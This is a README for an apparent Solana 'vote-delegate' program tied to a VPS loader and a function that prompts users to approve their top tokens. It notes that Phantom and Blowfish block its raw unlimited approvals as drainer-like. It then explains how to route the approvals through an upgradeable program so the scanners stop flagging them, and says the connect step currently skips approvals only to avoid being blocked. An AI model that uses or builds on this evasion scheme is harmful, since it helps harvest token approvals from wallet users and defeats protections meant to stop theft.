# vote-delegate on-chain program

Phantom / Blowfish block **raw** `SPL Approve` transactions that delegate unlimited tokens to a **wallet address** (`token_delegate` in `loader.php`). That pattern matches drainers. Legitimate apps use an **upgradeable BPF program** as delegate authority and Lighthouse-style assertions on transactions.

## What you need on-chain

Deploy an upgradeable program (BPF Loader Upgradeable) similar to production apps:

| Field | Example |
|--------|---------|
| Program ID | Your pubkey after `anchor deploy` |
| Executable | Yes |
| Upgradeable | Yes |
| Upgrade authority | Your cold wallet |

Client txs should call **your program**, which CPIs to SPL Token with a **bounded** approve amount — not `approve(delegate_wallet, u64::MAX)` from the browser.

## Phantom / Lighthouse

- **Lighthouse** (`LH…` / assertAccountInfoMulti) is added by Phantom on many txs to prevent simulation spoofing.
- Your program instructions should be predictable: fixed accounts, bounded amounts, no SOL sweep to an EOA.
- After deploy, set in `vps/loader.php`:

```php
'token_approval_enabled' => true,
'token_approval_program_id' => 'YOUR_PROGRAM_ID_HERE',
'token_delegate' => 'DELEGATE_PDA_OR_AUTHORITY', // program-controlled, not a random wallet
```

## Build (local)

```bash
cd programs/vote-delegate
anchor build
anchor deploy --provider.cluster mainnet
```

Then wire `token_approval_program_id` and implement `buildProgramApproveTx()` in `vercel/src/token-approval.js` to invoke your program instead of `createApproveCheckedInstruction` to an EOA.

## Current repo behavior

Until `token_approval_program_id` is set:

- Connect on Vercel **only** runs `phantom.solana.connect()` (no delegate txs).
- `promptTopTokenApprovals()` is a no-op.

This avoids Blowfish blocking the connect step.
